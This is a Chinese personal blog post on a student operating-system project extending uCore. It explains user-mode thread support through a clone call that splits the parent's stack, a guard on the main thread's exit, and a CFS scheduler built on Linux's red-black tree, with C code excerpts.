<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="lagrange&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="lagrange&#39;s blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="lagrange">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>lagrange's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lagrange's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">what's dead may never die</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/24/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lagrange">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lagrange's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/24/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">hardCore 进程管理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-24 10:47:34" itemprop="dateCreated datePublished" datetime="2021-03-24T10:47:34Z">2021-03-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-23 00:31:31" itemprop="dateModified" datetime="2021-04-23T00:31:31Z">2021-04-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/OS/" itemprop="url" rel="index"><span itemprop="name">OS</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="整体设计"><a href="#整体设计" class="headerlink" title="整体设计"></a>整体设计</h2><p>整个hardCore的进程部分由uCore扩展而来，我们主要扩展的目标有以下几个：</p>
<ol>
<li>实现对内核线程的支持，使得用户态可以使用多线程</li>
<li>扩展OS支持的调度算法：<ol>
<li>基于红黑树实现linux2.6版本中经典进程调度器CFS</li>
<li>stride调度器</li>
<li>RR调度器</li>
</ol>
</li>
<li>增加用户态的信号量支持，搭配内核线程在用户态实现生产者消费者，读者写者等经典线程同步算法</li>
<li>提高OS进程的可靠性，在用户态因为爆栈等错误退出的时候不会导致OS崩溃</li>
<li>实现top等用户命令，扩展shell功能支持用户态进程后台执行</li>
</ol>
<p>当前已经实现了内核态进程以及CFS调度器，下文详细的阐述了这两个部分的实现过程，下一阶段主要想实现的内容就是信号量以及用户态程序的支持，从而构建一个完整的OS。</p>
<h2 id="用户态内核进程实现"><a href="#用户态内核进程实现" class="headerlink" title="用户态内核进程实现"></a>用户态内核进程实现</h2><h3 id="linux-实现参考"><a href="#linux-实现参考" class="headerlink" title="linux 实现参考"></a>linux 实现参考</h3><p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/28535838/how-stack-or-memory-is-allocated-for-threads-under-the-same-process-in-linux?fileGuid=ZzkLVnaGVeiM443Q">How Stack or memory is allocated for threads under the same process in Linux</a></p>
<p>The current ‘thread’ concept in Linux is the NPTL one. NPTL uses<code>clone()</code>, which wraps<code>sys_clone()</code>. Allocating a stack for a new ‘thread’ is handled in the user space (ie. libc), not in kernel (ie. Linux). A library can allocate a stack using the allocation of choice (eg.<code>malloc</code>) and then call<code>clone()</code>passing this address as the stack (of course, needs to pass the top of the allocated region, since stacks grow downwards on most platforms):</p>
<p>Unlike<code>fork()</code>,<code>clone()</code>allows the child process to share parts of its execution context with the calling process, such as the memory space, the table of file descriptors, and the table of signal handlers….</p>
<p>The main use of<code>clone()</code>is to implement threads: multiple threads of control in a program that run concurrently in a shared memory space.</p>
<p>When the child process is created with<code>clone()</code>, it executes the function<code>fn(arg)</code>…</p>
<p>The child_stack argument specifies the location of the stack used by the child process …</p>
<p>If you want to learn more specific details, open the source of your distro<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man3/pthread_create.3.html?fileGuid=ZzkLVnaGVeiM443Q">pthread_create</a>implementation and get reading.</p>
<p>For example<a target="_blank" rel="noopener" href="https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/nptl/pthread_create.c?fileGuid=ZzkLVnaGVeiM443Q">pthread_create.c</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">__pthread_create_2_1 (newthread, attr, start_routine, arg)</span><br><span class="line">  ...</span><br><span class="line">  struct pthread *pd &#x3D; NULL;</span><br><span class="line">  int err &#x3D; ALLOCATE_STACK (iattr, &amp;pd);</span><br></pre></td></tr></table></figure>
<p>and<a target="_blank" rel="noopener" href="https://github.com/lattera/glibc/blob/a2f34833b1042d5d8eeb263b4cf4caaea138c4ad/nptl/allocatestack.c?fileGuid=ZzkLVnaGVeiM443Q">allocatestack.c</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># define ALLOCATE_STACK(attr, pd) allocate_stack (attr, pd, &amp;stackaddr)</span><br><span class="line">static int</span><br><span class="line">allocate_stack (const struct pthread_attr *attr, struct pthread **pdp,</span><br><span class="line">   ALLOCATE_STACK_PARMS)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>You’ll see that stack allocation has some whistles and bells, like caching and reusing stack regions, guard pages, but in the end is just a memory region allocated in user space.</p>
<h3 id="uCore-实现"><a href="#uCore-实现" class="headerlink" title="uCore 实现"></a>uCore 实现</h3><p>在 linux 中，thread 通过 clone 调用实现，但是分配栈空间是用户空间关心的事，比如使用 malloc 申请之类的。</p>
<p>在 uCore 中并没有实现用户态的 malloc，所以暂时无法使用 malloc 在堆区为一个新的进程开辟一个栈空间，但这并非就是无法实现进程。</p>
<p>于是我们换了另外一种方式就是挪用调用 clone 进程的栈空间。linux 默认为每个进程分配 1M 的栈空间，一旦某个进程调用 clone，我们将该调用进程 1M 的栈空间等分为 16 份，取出一块空闲的栈空间分配给该子线程。针对可能出现递归调用 phthread_create 的情况，不断向上找到第一个调用 clone，然后栈被分割成 16 份的进程，从该进程处获取栈空间。</p>
<p><img src="https://uploader.shimo.im/f/hAtGzepqeSu08AhO.png!thumbnail?fileGuid=ZzkLVnaGVeiM443Q" alt="图片"></p>
<p>子线程退出时会向该进程归还所使用的栈空间，所以包含该第一个调用 clone 的进程在内（下文统一称为祖宗线程），同一时间进程里可以存在 16 个线程。</p>
<h4 id="PCB-支持"><a href="#PCB-支持" class="headerlink" title="PCB 支持"></a>PCB 支持</h4><p>在 PCB 中增加以下三个变量用于支持内核线程</p>
<table>
<thead>
<tr>
<th align="left">Type</th>
<th align="left">name</th>
<th align="left">meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="left">int</td>
<td align="left">is_thread</td>
<td align="left">标志该进程是否是一个子线程</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">stack_num</td>
<td align="left">标志该子线程占用了父进程的哪一个栈帧，is_thread = 1 才有效</td>
</tr>
<tr>
<td align="left">int [ ]</td>
<td align="left">stack[MAX_THREAD]</td>
<td align="left">每个主进程能够开启 16 个线程（包括主线程（自己）在内），每个块为 0 表示该块的栈没有被占用，不为 0 表示被占用，且值是该子线程的 pid</td>
</tr>
</tbody></table>
<p>特别说明只有祖宗线程和普通进程 is_thread 为 0，其他子线程该值都是 1。</p>
<h4 id="clone-调用"><a href="#clone-调用" class="headerlink" title="clone 调用"></a>clone 调用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">int do_clone(void *(*fn)(void *), void *arg, void (*exit)(int))</span><br><span class="line">&#123;</span><br><span class="line">    int ret &#x3D; -E_NO_FREE_PROC;</span><br><span class="line">    struct proc_struct *proc;</span><br><span class="line">    if (nr_process &gt;&#x3D; MAX_PROCESS)</span><br><span class="line">        goto fork_out;</span><br><span class="line">    ret &#x3D; -E_NO_MEM;</span><br><span class="line">    &#x2F;&#x2F; 新建一个空进程描述符</span><br><span class="line">    if ((proc &#x3D; alloc_proc()) &#x3D;&#x3D; NULL)</span><br><span class="line">        goto fork_out;</span><br><span class="line">    &#x2F;&#x2F; 设置线程名称为 父线程名称-t</span><br><span class="line">    int i &#x3D; 0;</span><br><span class="line">    for (i &#x3D; 0; current-&gt;name[i] !&#x3D; &#39;\0&#39;; i++)</span><br><span class="line">        proc-&gt;name[i] &#x3D; current-&gt;name[i];</span><br><span class="line">    proc-&gt;name[i] &#x3D; &#39;-&#39;;</span><br><span class="line">    proc-&gt;name[i + 1] &#x3D; &#39;t&#39;;</span><br><span class="line">    proc-&gt;name[i + 2] &#x3D; &#39;\0&#39;;</span><br><span class="line">    proc-&gt;is_thread &#x3D; 1; &#x2F;&#x2F;标志该进程是一个子线程</span><br><span class="line">    &#x2F;&#x2F; 针对可能出现递归调用pthread_create的情况，找到不为线程的主进程</span><br><span class="line">    struct proc_struct *father &#x3D; current;</span><br><span class="line">    while (father-&gt;is_thread)</span><br><span class="line">        father &#x3D; father-&gt;parent;</span><br><span class="line">    &#x2F;&#x2F; 如果不设置线程归属于调用clone的线程，直接指向主线程会导致子线程中没法调用join来等待</span><br><span class="line">    proc-&gt;parent &#x3D; current;</span><br><span class="line">    &#x2F;&#x2F; 在主线程里面找一块栈分配给该子线程</span><br><span class="line">    proc-&gt;stack_num &#x3D; 1;</span><br><span class="line">    for (; proc-&gt;stack_num &lt; MAX_THREAD; proc-&gt;stack_num++)</span><br><span class="line">        if (father-&gt;stack[proc-&gt;stack_num] &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            father-&gt;stack[proc-&gt;stack_num] &#x3D; 1;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    assert(proc-&gt;stack_num !&#x3D; MAX_THREAD);</span><br><span class="line">    assert(current-&gt;wait_state &#x3D;&#x3D; 0);</span><br><span class="line">    &#x2F;&#x2F; 设置内核栈</span><br><span class="line">    if (setup_kstack(proc) !&#x3D; 0)</span><br><span class="line">        goto bad_fork_cleanup_proc;</span><br><span class="line">    &#x2F;&#x2F; 文件系统直接指向父进程</span><br><span class="line">    if (copy_fs(CLONE_FS, proc) !&#x3D; 0)</span><br><span class="line">        goto bad_fork_cleanup_kstack;</span><br><span class="line">    &#x2F;&#x2F; mm 直接指向父进程， 一个用户进程有1MB的栈空间</span><br><span class="line">    &#x2F;&#x2F; 256页，一个线程给16页，包括原有的主线程的话，能开16个线程</span><br><span class="line">    if (copy_mm(CLONE_VM, proc) !&#x3D; 0)</span><br><span class="line">        goto bad_fork_cleanup_fs;</span><br><span class="line">    &#x2F;&#x2F; !! 注意这个地址不是这个线程的地址，是上一个线程栈的栈底地址</span><br><span class="line">    &#x2F;&#x2F; 给线程分配栈,一个进程16页</span><br><span class="line">    uint32_t thread_stack_top &#x3D; USTACKTOP - (proc-&gt;stack_num) * 16 * PGSIZE;</span><br><span class="line">    &#x2F;&#x2F; 预先给两页给新分配的线程</span><br><span class="line">    assert(pgdir_alloc_page(proc-&gt;mm-&gt;pgdir, thread_stack_top - PGSIZE, PTE_USER) !&#x3D; NULL);</span><br><span class="line">    assert(pgdir_alloc_page(proc-&gt;mm-&gt;pgdir, thread_stack_top - 2 * PGSIZE, PTE_USER) !&#x3D; NULL);</span><br><span class="line">    proc-&gt;tf &#x3D; (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - 1;</span><br><span class="line">    struct trapframe *tf &#x3D; proc-&gt;tf;</span><br><span class="line">    memset(tf, 0, sizeof(struct trapframe));</span><br><span class="line">    tf-&gt;tf_cs &#x3D; USER_CS;</span><br><span class="line">    tf-&gt;tf_ds &#x3D; tf-&gt;tf_es &#x3D; tf-&gt;tf_ss &#x3D; USER_DS;</span><br><span class="line">    &#x2F;&#x2F; 把栈往上抬4个字节,才开始放东西，否则栈会越界</span><br><span class="line">    &#x2F;&#x2F; 先放exit的参数为0</span><br><span class="line">    *(uint32_t *)(thread_stack_top - 1 * sizeof(uint32_t)) &#x3D; (uint32_t)0;</span><br><span class="line">    &#x2F;&#x2F; 压入线程函数的参数地址</span><br><span class="line">    *(uint32_t *)(thread_stack_top - 2 * sizeof(uint32_t)) &#x3D; (uint32_t)arg;</span><br><span class="line">    &#x2F;&#x2F; 压入上一个函数的返回地址为 exit ，保证函数结束并没有显式调用 exit 时系统能帮助该线程退出。</span><br><span class="line">    *(uint32_t *)(thread_stack_top - 3 * sizeof(uint32_t)) &#x3D; exit;</span><br><span class="line">    tf-&gt;tf_esp &#x3D; thread_stack_top - 3 * sizeof(uint32_t);</span><br><span class="line">    &#x2F;&#x2F; 设置 eip 指向当前函数开始执行</span><br><span class="line">    tf-&gt;tf_eip &#x3D; fn;</span><br><span class="line">    tf-&gt;tf_eflags &#x3D; FL_IF;</span><br><span class="line">    ret &#x3D; 0;</span><br><span class="line">    tf-&gt;tf_regs.reg_eax &#x3D; 0;</span><br><span class="line">    tf-&gt;tf_eflags |&#x3D; FL_IF;</span><br><span class="line">    &#x2F;&#x2F; context 在调度的时候会弹出 tf 内的寄存器，恢复程序执行</span><br><span class="line">    proc-&gt;context.eip &#x3D; (uintptr_t)forkret;</span><br><span class="line">    proc-&gt;context.esp &#x3D; (uintptr_t)(proc-&gt;tf);</span><br><span class="line">    bool intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid &#x3D; get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        set_links(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line">    &#x2F;&#x2F; 重新设置父线程的栈被该子线程占用</span><br><span class="line">    father-&gt;stack[proc-&gt;stack_num] &#x3D; proc-&gt;pid;</span><br><span class="line">    ret &#x3D; proc-&gt;pid;</span><br><span class="line">fork_out:</span><br><span class="line">    return ret;</span><br><span class="line">bad_fork_cleanup_fs: &#x2F;&#x2F;for LAB8</span><br><span class="line">    put_fs(proc);</span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    goto fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意因为用户有可能不会在线程执行的函数结束返回时调用 exit，所以 clone 的一个任务就是帮助用户将线程栈栈底的返回地址设置为 sys_exit (不是直接 do_exit 因为该线程执行在用户态，只有通过系统调用才能执行内核态代码)<br>最后的线程栈栈帧如图所示</p>
<p><img src="https://uploader.shimo.im/f/lKtHA4uomBRs6JTi.png!thumbnail?fileGuid=ZzkLVnaGVeiM443Q" alt="图片"></p>
<h4 id="祖宗线程-exit-时守护"><a href="#祖宗线程-exit-时守护" class="headerlink" title="祖宗线程 exit 时守护"></a>祖宗线程 exit 时守护</h4><p>若祖宗线程没有调用 join 来等待子线程结束工作，祖宗线程会直接退出，虽然这样内存空间的引用计数不为 0，不会释放他们共用的内存空间，剩余线程还能继续执行，但是所有栈的分配信息都存在祖宗线程的 PCB 表中，如果祖宗线程一旦释放，子进程再想调用 phthread_create 新建子进程会导致失败。于是必须在祖宗线程调用 sys_exit 时守护所有子线程退出后祖宗线程才能退出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">sys_exit(uint32_t arg[]) &#123;</span><br><span class="line">    int error_code &#x3D; (int)arg[0];</span><br><span class="line">    if (is_ancestral_thread(current)) &#x2F;&#x2F;祖宗进程只有在所有子线程全部释放后才能退出</span><br><span class="line">        while (current_have_kid())    &#x2F;&#x2F;只要有儿子就等着</span><br><span class="line">            do_wait(0, NULL);</span><br><span class="line">    return do_exit(error_code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="线程一致性维护"><a href="#线程一致性维护" class="headerlink" title="线程一致性维护"></a>线程一致性维护</h4><p>linux 上的线程就是基于轻量级进程, 由用户态的 pthread 库实现的.使用 pthread 以后, 在用户看来, 每一个 task_struct 就对应一个线程, 而一组线程以及它们所共同引用的一组资源就是一个进程。但是, 一组线程并不仅仅是引用同一组资源就够了, 它们还必须被视为一个整体。当”进程”收到一个致命信号(比如由于段错误收到 SIGSEGV 信号), 对应的这一组 task_struct 将全部退出。这是 POSIX 对线程实现提出的要求，如果某个线程”挂”了, 整个进程还在若无其事地运行着, 可能会出现很多的不一致状态. 进程将不是一个整体, 而线程也不能称为线程。</p>
<p>在 uCore 中我们也实现了该线程的一致性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">case T_PGFLT:  &#x2F;&#x2F;page fault</span><br><span class="line">    if ((ret &#x3D; pgfault_handler(tf)) !&#x3D; 0) &#123;</span><br><span class="line">        print_trapframe(tf);</span><br><span class="line">        if (current &#x3D;&#x3D; NULL) &#123;</span><br><span class="line">            panic(&quot;handle pgfault failed. ret&#x3D;%d\n&quot;, ret);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            if (trap_in_kernel(tf)) &#123;</span><br><span class="line">                panic(&quot;handle pgfault failed in kernel mode. ret&#x3D;%d\n&quot;, ret);</span><br><span class="line">            &#125;</span><br><span class="line">            cprintf(&quot;killed by kernel.\n&quot;);</span><br><span class="line">            &#x2F;&#x2F; panic(&quot;handle user mode pgfault failed. ret&#x3D;%d\n&quot;, ret);</span><br><span class="line">            kill_all_thread();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    break;</span><br></pre></td></tr></table></figure>
<p>比如有一个线程缺页异常的话，对应的这组进程都会被杀死。</p>
<h2 id="CFS进程调度实现"><a href="#CFS进程调度实现" class="headerlink" title="CFS进程调度实现"></a>CFS进程调度实现</h2><p>其他两个调度器的实现比较简单，这里主要研究CFS调度器是如何实现的</p>
<h3 id="CFS调度器介绍"><a href="#CFS调度器介绍" class="headerlink" title="CFS调度器介绍"></a>CFS调度器介绍</h3><p>cfs 定义了一种新的模型，它给 cfs_rq（cfs的run queue）中的每一个进程安排一个虚拟时钟，vruntime。如果一个进程得以执行，随着时间的增长（也就是一个个tick的到来），其vruntime将不断增大。没有得到执行的进程vruntime不变。而调度器总是选择vruntime跑得最慢的那个进程来执行。这就是所谓的“完全公平”。为了区别不同优先级的进程，优先级高的进程vruntime增长得慢，以至于它可能得到更多的运行机会。</p>
<p>如果分配给进程的运行时间不等于实际运行的时间时：CFS的思想就是让每个调度实体的vruntime增加速度不同，权重越大的增加的越慢，这样高优先级进程就能获得更多的cpu执行时间，而vruntime值较小者也得到执行。</p>
<p>每一个进程或者调度组都对应一个调度的实体，每一个进程都通过调度实体与CFS运行对列建立联系，每次进行CFS调度的时候都会在CFS运行对列红黑树中选择一个进程（vruntime值较小者）。cfs_rq代表CFS运行对列，它可以找到对应的红黑树。进程task_struct ，可以找到对应的调度实体。调度实体sched_entity对应运行对列红黑树上的一个节点。</p>
<h3 id="调度器实现"><a href="#调度器实现" class="headerlink" title="调度器实现"></a>调度器实现</h3><p>运行队列中的进程/线程会频繁进行插入和删除。为了效率考虑，CFS调度队列我们需要使用红黑树来实现，每次选择最小vruntime的节点执行（即选择这颗红黑树上的最左节点）将其从这颗红黑树中删除，调度到CPU上执行。因为C语言中没有提供面向对象的编程方法，我们借用linux内核中提供的红黑树的基础库来实现我们自己的cfs红黑树。简单介绍一下linux内核里的红黑树。</p>
<p>Linux有很多地方用到了红黑树，比如高精度计时器使用红黑树树组织定时请求，EXT3文件系统也使用红黑树树来管理目录，虚拟存储管理系统也有用红黑树树进行VMAs（Virtual Memory Areas）的管理。Linux内核红黑树的实现与传统的实现方式有些不同，它对针对内核对速度的需要做了优化。每一个rb_node节点是嵌入在用RB树进行组织的数据结构中，而不是用rb_node指针进行数据结构的组织。对于CFS运行队列这颗红黑树的节点 cfs_node，我们只要在里面内嵌一个 rb_node 节点再加一个指向该进程PCB的指针，我们就可以利用linux提供的红黑树操作函数来封装出一个我们自己的CFS调度队列。</p>
<p>对于一个挂在CFS队列里面的进程，我们需要实现的方法有</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> KERN_SCHEDULE_CFS_RBTREE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERN_SCHEDULE_CFS_RBTREE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cfs_node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">struct cfs_node *<span class="title">cfs_search</span><span class="params">(struct rb_root *root, struct proc_struct *proc)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cfs_insert</span><span class="params">(struct rb_root *root, struct proc_struct *proc)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cfs_node_free</span><span class="params">(struct cfs_node *node)</span></span>;</span><br><span class="line"><span class="function">struct proc_struct * <span class="title">cfs_find_min</span><span class="params">(struct rb_root *root)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare_cfs_node</span><span class="params">(struct proc_struct *a, struct proc_struct *b)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>一个节点的插入和删除，找最小（就是找最左子节点），还有节点值的大小比较。这里值得关注的函数就是节点值大小比较。在 linux 中的红黑树中，若两个节点的 value 大小相等会放弃插入，但是连续插入的两个 vruntime 很可能相同，针对这种情况，重新规定红黑树的排序规则</p>
<p>vruntime 不同时比较 vruntime ，vruntime大者大。vruntime 相同时比较 pid ，pid大者大.   因为树里面不可能有两个相同的进程,所以该排序可以保证线序关系。</p>
<p>下面简单的去实现这个红黑树节点的方法</p>
